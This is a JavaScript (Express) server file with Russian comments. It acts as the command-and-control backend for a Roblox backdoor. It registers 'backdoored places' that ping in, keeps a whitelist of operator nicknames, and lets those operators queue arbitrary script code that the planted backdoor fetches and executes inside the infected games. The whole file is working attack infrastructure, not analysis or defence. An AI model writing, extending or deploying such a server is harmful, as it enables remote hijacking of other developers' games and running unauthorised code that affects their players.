const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// База данных в памяти сервера
let whitelist = ["sewarg47"];
let activePlaces = {}; // { placeId: timestamp }
let pendingScripts = {}; // Хранилище скриптов для каждого плейса

// 1. Добавление ника в белый список с сайта
app.post('/add-whitelist', (req, res) => {
    const nick = req.body.nick;
    if (nick) {
        if (!whitelist.includes(nick)) {
            whitelist.push(nick);
            console.log(`[+] Добавлен в whitelist: ${nick}`);
        }
        res.json({ success: true, whitelist: whitelist });
    } else {
        res.status(400).json({ success: false, error: 'Nick is required' });
    }
});

// 2. Проверка белого списка (для бэкдора из Роблокса)
app.get('/check-whitelist', (req, res) => {
    const nick = req.query.nick;
    if (whitelist.includes(nick)) {
        res.json({ allowed: true });
    } else {
        res.json({ allowed: false });
    }
});

// 3. Авто-регистрация / пинг забекдоренного плейса из игры
app.post('/ping-place', (req, res) => {
    const { placeId } = req.body;
    if (placeId) {
        activePlaces[placeId] = Date.now();
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'PlaceID required' });
    }
});

// 4. Получение списка активных плейсов
app.get('/active-places', (req, res) => {
    const now = Date.now();
    let currentActive = [];
    
    for (let placeId in activePlaces) {
        if (now - activePlaces[placeId] < 30000) {
            currentActive.push(placeId);
        } else {
            delete activePlaces[placeId];
        }
    }
    
    res.json(currentActive);
});

// 5. Эндпоинт для отправки скрипта с сайта
app.post('/set-script', (req, res) => {
    const { placeId, command, nick } = req.body;
    if (!whitelist.includes(nick)) {
        return res.json({ success: false, status: 'not_in_whitelist' });
    }
    pendingScripts[placeId] = command; // Сохраняем код для конкретного плейса
    res.json({ success: true });
});

// 6. Новый эндпоинт: бэкдор из Роблокса забирает отсюда готовый скрипт на выполнение
app.get('/get-script', (req, res) => {
    const placeId = req.query.placeId;
    if (pendingScripts[placeId]) {
        const code = pendingScripts[placeId];
        delete pendingScripts[placeId]; // Удаляем после отправки
        res.json({ success: true, code: code });
    } else {
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Oboudno Backend running on port ${PORT}`);
});
